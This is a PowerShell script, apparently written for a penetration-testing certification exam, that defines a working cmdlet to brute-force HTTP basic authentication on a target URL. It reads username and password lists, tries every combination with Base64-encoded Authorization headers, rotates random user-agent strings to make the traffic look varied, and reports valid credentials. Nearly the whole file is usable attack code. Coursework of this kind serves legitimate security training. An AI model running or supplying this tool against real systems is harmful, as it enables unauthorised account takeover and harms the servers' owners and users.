## Powershell For Penetration Testers Exam Task 1 - Brute Force Basic Authentication Cmtlet

function BruteforceHttpAuth {

<#

.SYNOPSIS
This powershell cmdlet can be used to bruteforce HTTP basic authenticaion used in web server. 

.DESCRIPTION
This powershell script iterate through list of usernames and passwords until a valid combination found.

.PARAMETER URL
The target URL to bruteforce supplied with target port, use the -URL switch.

.PARAMETER UsernameList
The list of usernames used for bruteforcing the target.

.PARAMETER PasswordList
The password list used for bruteforcing the target.

.EXAMPLE
PS C:> . .\http-auth-bruteforce.ps1
PS C:\> BruteforceHttpAuth -URL http://target/index.php -UsernameList .\usernames.txt -PasswordList .\passwords.txt

.LINK
https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/HTTP-Login.ps1
https://github.com/tubesurf/PSPT/tree/master/1-Brute-Force-Basic-Authentication
https://github.com/ahhh/PSSE/blob/master/Brute-Basic-Auth.ps1

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3225

#>


	[CmdletBinding()] param (
		[Parameter(Position = 0, ValueFromPipeline=$true)]
		[String]
		$URL,
		[Parameter(Position = 1)]
        [String]
        $UsernameList,

        [Parameter(Position = 2)]
        [String]
        $PasswordList
		
    )

	# Read supplied usernames and passwords lists
    $users = Get-Content $UsernameList
    $passwords = Get-Content $PasswordList
	[System.Net.ServicePointManager]::DnsRefreshTimeout = 0
	# Iterating through usernames list first, to try every possible password with each username
    foreach ($uname in $users){
        
		#Looping through the passwords list
        foreach ($pass in $passwords){
            
			# Calling the EncodeToBase64 function which will return a Base64 encoded password needed to form HTTP header
			$basicAuth = EncodeToBase64 $uname $pass
            # Calling Get-UA function which will return a random user-agent to use it within the HTTP header
			$ua = Get-UA
			
            # Creating web request object and forming the HTTP headers
            try {
				
                 $WebRequest = [System.Net.WebRequest]::Create($URL)
                 $WebRequest.PreAuthenticate=$true
                 $WebRequest.AllowAutoRedirect=$false
                 $WebRequest.TimeOut = 6000
                 $WebRequest.KeepAlive=$true
                 $WebRequest.Method = "GET"
                 $WebRequest.Headers.Add('UserAgent', $ua)
                 $WebRequest.Headers.Add("Authorization", $basicAuth);
                 $WebRequest.Headers.Add("Keep-Alive: 300");
				 $WebRequest.Headers.Add("Cache-Control","no-cache");
				
				# Attempting the request and storing the response
                 $WebResponse = $WebRequest.GetResponse()
                 $ResponseCode = $WebResponse.StatusCode
				
				# Check if the  response is 200 OK
                 if ($WebResponse.StatusCode -eq "OK")
                 {
                     # Print the successfull credentials to the user 
                     Write-host "[+] Successfully Logged In With $($uname):$($pass)" -ForegroundColor Green
                 }
                 
            
            }
			
			# If request fails for any reasons, the catch block will print it
            catch {
              $ResponseCode = $Error[0].Exception.InnerException.Response.StatusCode
              
			  # Not every exception returns a StatusCode
			  # If excepting has no status code, return the status
			  if ($ResponseCode -eq $null) {

                  $ResponseCode = $Error[0].Exception.InnerException.Status

                  }
            }


        }

    }

}

function Get-UA {

	# Populating the UAList with random user-agents
	$UAList = @('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1)',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
	'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
	'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
	'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
	'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1')
	
	# Chosing a random user-agent
	$UserAgent = Get-Random -Input $UAList
	# Return the selected user-agent to the caller
	return $UserAgent
}

function EncodeToBase64
{

    [CmdletBinding()] Param(
        
            [Parameter(Mandatory = $true)]
            [String]
            $username,
            
            [Parameter(Mandatory = $true)]
            [String]
            $password
    )

    # Create username and password pairs
    $pair = "$($username):$($password)"
    # Converting the password to base64 encoded string
    $SecurePass = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))
    # Create value that will be added to the HTTP headers     
    $auth = "Basic $SecurePass"

    return $auth

}

